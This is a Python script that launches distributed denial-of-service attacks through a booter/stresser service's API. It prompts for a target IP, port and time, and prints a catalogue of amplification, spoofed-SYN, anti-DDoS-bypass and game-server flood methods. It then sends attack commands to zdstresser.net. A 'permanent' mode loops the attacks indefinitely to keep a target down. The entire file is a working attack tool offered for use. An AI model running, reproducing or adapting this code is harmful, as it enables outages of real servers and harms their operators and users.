import requests
import time
import json

def ddos():
    methodlist = """1	DNS	IPv4 (L3 ,L4)	Method based on Domain Name System, have bigest amplification power. Recomended for home connection, unprotected servers.
2	4G	IPv4 (L3 ,L4)	Method based on Private Paylod , have bigest amplification power. Recomended for home connection, unprotected servers.
3	NTP	IPv4 (L3 ,L4)	Based on Network Time Protocol, have bggest pps. Best for home connection and unprotected servers.
4	SNMP	IPv4 (L3 ,L4)	Use in most case unprotected routers on world to amplification attack, works on Simple Network Management Protocol.
6	WSD	IPv4 (L3 ,L4)	UDP based Amplification. Can bypass Anti-DDos protection.
7	COAP	IPv4 (L3 ,L4)	UDP based Amplification. Can bypass Anti-DDos protection.
19	HOSTPOT	IPv4 (L3 ,L4)	Special methods use mixed game servers to amplification, use random ports and games. Recomended for protected servers.
46	SSDP	IPv4 (L3 ,L4)	Simple Service Discovery Protocol (SSDP). Reflection-based exploit that uses Universal Plug and Play (UPnP) networking protocols in order to send an amplified amount of traffic to a target, overwhelming the targets infrastructure and taking their web or r
94	PORTMAP	IPv4 (L3 ,L4)	amp method recommend for middle protected server
102	DHIP	IPv4 (L3 ,L4)	
103	ARD (apple remove desktop)	IPv4 (L3 ,L4)	ARD (apple remove desktop) recommended for middle protection
106	NetBIOS	IPv4 (L3 ,L4)	
123	AmpMix	IPv4 (L3 ,L4)	
 Categorie: TCP
ID	Name	Type	Description
8	XSYN	IPv4 (L3 ,L4)	TCP based Spoofed SYN attack that exploits part of the normal TCP three-way handshake to consume resources on the targeted server and render it unresponsive.
9	XACK	IPv4 (L3 ,L4)	An ACK flood attack is when an attacker attempts to overload a server with TCP ACK packets. Like other DDoS attacks, the goal of an ACK flood is to deny service to other users by slowing down or crashing the target using junk data. The targeted server has
10	XMAS	IPv4 (L3 ,L4)	Strong TCP, big pps, recomended for websites and server works on TCP protocol.
12	TCP-AMP	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
13	TCP-DANGER	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
14	TCP-KILL	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
15	TCP-RKILL	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
61	WRA	IPv4 (L3 ,L4)	TCP syn attack with scaled tcp flags. can bypass anti ddos
95	TCP-Bypass	IPv4 (L3 ,L4)	
160	TCP	IPv4 (L3 ,L4)	
 Categorie: UDP
ID	Name	Type	Description
16	BYPASS	IPv4 (L3 ,L4)	Special methods for specific targets, based on UDP protocol, recomended for protected servers.
17	STORM	IPv4 (L3 ,L4)	Special methods Custom made , recomended for miedium protected servers.
18	REK	IPv4 (L3 ,L4)	Special methods Custom made , recomended for miedium protected servers.
20	OPENVPN-V2	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
107	UDP-MIX	IPv4 (L3 ,L4)	
115	NAT	IPv4 (L3 ,L4)	
127	Game Killer	IPv4 (L3 ,L4)	
 Categorie: Premium
ID	Name	Type	Description
22	IPSec	IPv4 (L3 ,L4)	Dedicated method for IPSec servers,
23	TS3Droper	IPv4 (L3 ,L4)	Dedicated method for TeamSpeak servers, use ts3 protocol. Recomended for protected/unprotected ts3 servers.
24	TS3Fuck	IPv4 (L3 ,L4)	Dedicated method for TeamSpeak servers, use ts3 protocol. Recomended for protected/unprotected ts3 servers.
25	ABUSE	IPv4 (L3 ,L4)	Dedicated method to send Abuse at Target
26	GRENADE	IPv4 (L3 ,L4)	Methods based on Layer 3, use GRE protocol. Easy to bypas UDP/TCP/ICMP rules. Use for medium protected servers.
27	Ubnt Network	IPv4 (L3 ,L4)	UDP based reflection attack. Can be used to bypass Anti-Ddos.
28	QUICK - GOOGLE NETWORK	IPv4 (L3 ,L4)	UDP based reflection attack use google payload . Can be used to bypass Anti-Ddos.
29	PPTP	IPv4 (L3 ,L4)	Dedicated method for PPTP servers,
30	IPX	IPv4 (L3 ,L4)	Dedicated method recommended for medium protected servers.
99	IPSEC-V2	IPv4 (L3 ,L4)	Dedicated method for IPSec servers,
158	VSE-BYPASS	IPv4 (L3 ,L4)	
 Categorie: Game
ID	Name	Type	Description
31	Arma3	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Arma3)..
32	SOURCE	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers...
33	FiveM	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Fivem)..
34	FiveMDedicated	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Fivem)..
35	Minecraft	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Minecraft)..
36	Cod (Blackops)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Blackops)...
37	BF (Battlefield)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Battlefield)...
38	CS (Counter-Strike)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Counter-Strike)...
39	Quake	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.
40	Vicesity	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.
41	TF (Game Site)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(TF-Game)...
42	MoH (Medal of Honor)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Medal of Honor)...
43	Steam Game	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Steam Game)...
44	SAMP	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Samp)...
45	MTA (Multi Theft Auto)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(GTA)...
101	STEAM-RAW	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recommended for protected servers.(Steam Game)...
111	L4D	IPv4 (L3 ,L4)	
112	FIVEM-Beta	IPv4 (L3 ,L4)	
159	Game-Blast	IPv4 (L3 ,L4)	Recommend - For game middle protection"""
    ip = input("Target IP:")
    port = input("port:")
    timer = input("Time (max 3600):")
    print("Here are some methods:\n")
    time.sleep(3)
    print(methodlist)
    methods = input("method (name):") #cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
    concurrents = input("Concurrents (max 5):")
    hub = "basic"
    payload = {"target": ip, "port": port, "time": timer, "method": methods, "hub": hub}
    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
    print("Executing...\n")
    response = requests.get(baseurl, params=payload)
    responsejson = response.json()
    print("Checking response...")
    for key, value in responsejson.items():
        print(key, ":", value)
    print(str("\nSuccess! Executed: ") + response.url)
    print("\nSuccess! Executed on target!")
    time.sleep(5)
    if 1 < int(concurrents) <= 5: # set the number 5 to whatever the maximum concurrents is allowed for your plan
        for i in range(int(concurrents)):
            ddos()


def ddosperm():
    methodlist = """1	DNS	IPv4 (L3 ,L4)	Method based on Domain Name System, have bigest amplification power. Recomended for home connection, unprotected servers.
2	4G	IPv4 (L3 ,L4)	Method based on Private Paylod , have bigest amplification power. Recomended for home connection, unprotected servers.
3	NTP	IPv4 (L3 ,L4)	Based on Network Time Protocol, have bggest pps. Best for home connection and unprotected servers.
4	SNMP	IPv4 (L3 ,L4)	Use in most case unprotected routers on world to amplification attack, works on Simple Network Management Protocol.
6	WSD	IPv4 (L3 ,L4)	UDP based Amplification. Can bypass Anti-DDos protection.
7	COAP	IPv4 (L3 ,L4)	UDP based Amplification. Can bypass Anti-DDos protection.
19	HOSTPOT	IPv4 (L3 ,L4)	Special methods use mixed game servers to amplification, use random ports and games. Recomended for protected servers.
46	SSDP	IPv4 (L3 ,L4)	Simple Service Discovery Protocol (SSDP). Reflection-based exploit that uses Universal Plug and Play (UPnP) networking protocols in order to send an amplified amount of traffic to a target, overwhelming the targets infrastructure and taking their web or r
94	PORTMAP	IPv4 (L3 ,L4)	amp method recommend for middle protected server
102	DHIP	IPv4 (L3 ,L4)	
103	ARD (apple remove desktop)	IPv4 (L3 ,L4)	ARD (apple remove desktop) recommended for middle protection
106	NetBIOS	IPv4 (L3 ,L4)	
123	AmpMix	IPv4 (L3 ,L4)	
 Categorie: TCP
ID	Name	Type	Description
8	XSYN	IPv4 (L3 ,L4)	TCP based Spoofed SYN attack that exploits part of the normal TCP three-way handshake to consume resources on the targeted server and render it unresponsive.
9	XACK	IPv4 (L3 ,L4)	An ACK flood attack is when an attacker attempts to overload a server with TCP ACK packets. Like other DDoS attacks, the goal of an ACK flood is to deny service to other users by slowing down or crashing the target using junk data. The targeted server has
10	XMAS	IPv4 (L3 ,L4)	Strong TCP, big pps, recomended for websites and server works on TCP protocol.
12	TCP-AMP	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
13	TCP-DANGER	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
14	TCP-KILL	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
15	TCP-RKILL	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
61	WRA	IPv4 (L3 ,L4)	TCP syn attack with scaled tcp flags. can bypass anti ddos
95	TCP-Bypass	IPv4 (L3 ,L4)	
160	TCP	IPv4 (L3 ,L4)	
 Categorie: UDP
ID	Name	Type	Description
16	BYPASS	IPv4 (L3 ,L4)	Special methods for specific targets, based on UDP protocol, recomended for protected servers.
17	STORM	IPv4 (L3 ,L4)	Special methods Custom made , recomended for miedium protected servers.
18	REK	IPv4 (L3 ,L4)	Special methods Custom made , recomended for miedium protected servers.
20	OPENVPN-V2	IPv4 (L3 ,L4)	Amplified TCP reflection attack with high Pps. Hard to mitigate.
107	UDP-MIX	IPv4 (L3 ,L4)	
115	NAT	IPv4 (L3 ,L4)	
127	Game Killer	IPv4 (L3 ,L4)	
 Categorie: Premium
ID	Name	Type	Description
22	IPSec	IPv4 (L3 ,L4)	Dedicated method for IPSec servers,
23	TS3Droper	IPv4 (L3 ,L4)	Dedicated method for TeamSpeak servers, use ts3 protocol. Recomended for protected/unprotected ts3 servers.
24	TS3Fuck	IPv4 (L3 ,L4)	Dedicated method for TeamSpeak servers, use ts3 protocol. Recomended for protected/unprotected ts3 servers.
25	ABUSE	IPv4 (L3 ,L4)	Dedicated method to send Abuse at Target
26	GRENADE	IPv4 (L3 ,L4)	Methods based on Layer 3, use GRE protocol. Easy to bypas UDP/TCP/ICMP rules. Use for medium protected servers.
27	Ubnt Network	IPv4 (L3 ,L4)	UDP based reflection attack. Can be used to bypass Anti-Ddos.
28	QUICK - GOOGLE NETWORK	IPv4 (L3 ,L4)	UDP based reflection attack use google payload . Can be used to bypass Anti-Ddos.
29	PPTP	IPv4 (L3 ,L4)	Dedicated method for PPTP servers,
30	IPX	IPv4 (L3 ,L4)	Dedicated method recommended for medium protected servers.
99	IPSEC-V2	IPv4 (L3 ,L4)	Dedicated method for IPSec servers,
158	VSE-BYPASS	IPv4 (L3 ,L4)	
 Categorie: Game
ID	Name	Type	Description
31	Arma3	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Arma3)..
32	SOURCE	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers...
33	FiveM	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Fivem)..
34	FiveMDedicated	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Fivem)..
35	Minecraft	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Minecraft)..
36	Cod (Blackops)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Blackops)...
37	BF (Battlefield)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Battlefield)...
38	CS (Counter-Strike)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Counter-Strike)...
39	Quake	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.
40	Vicesity	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.
41	TF (Game Site)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(TF-Game)...
42	MoH (Medal of Honor)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Medal of Honor)...
43	Steam Game	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Steam Game)...
44	SAMP	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(Samp)...
45	MTA (Multi Theft Auto)	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recomended for protected servers.(GTA)...
101	STEAM-RAW	IPv4 (L3 ,L4)	Special methods for specific targets, based on game protocol, recommended for protected servers.(Steam Game)...
111	L4D	IPv4 (L3 ,L4)	
112	FIVEM-Beta	IPv4 (L3 ,L4)	
159	Game-Blast	IPv4 (L3 ,L4)	Recommend - For game middle protection"""
    ip = input("Target IP:")
    port = input("port:")
    timer = "3600"
    print("Here are some methods:\n")
    time.sleep(3)
    print(methodlist)
    methods = input("method (name):") #cap sensitive, and if you put in the ID your an idiot and thats why it doesnt work ;)
    hub = "basic"
    payload = {"target": ip, "port": port, "time": timer, "method": methods, "hub": hub}
    baseurl = "http://zdstresser.net/panel/apiv1/?userid=REDACTED&key=REDACTED&command=post.attack&type=ip4" #Put your userid and key where it says redacted
    print("Executing...\n")

    def ddosloop():
        count = 0
        while count < 5:  # set count to maximum concurrents your plan allows
            response = requests.get(baseurl, params=payload)
            responsejson = response.json()
            print("Checking response...")
            for key, value in responsejson.items():
                print(key, ":", value)
            print(str("\nSuccess! Executed: ") + response.url)
            count += 1

    looper = 0
    while looper != 1:
        ddosloop()
        time.sleep(3620)  # Set this to whatever your maximum boot time on zdstresser.net is + 20 seconds for latency


def queryofloop():
    loopornot = input("\nTemporary outage or permanent? [T:P]")
    if loopornot == "t":
        ddos()
    elif loopornot == "p":
        ddosperm()


queryofloop()
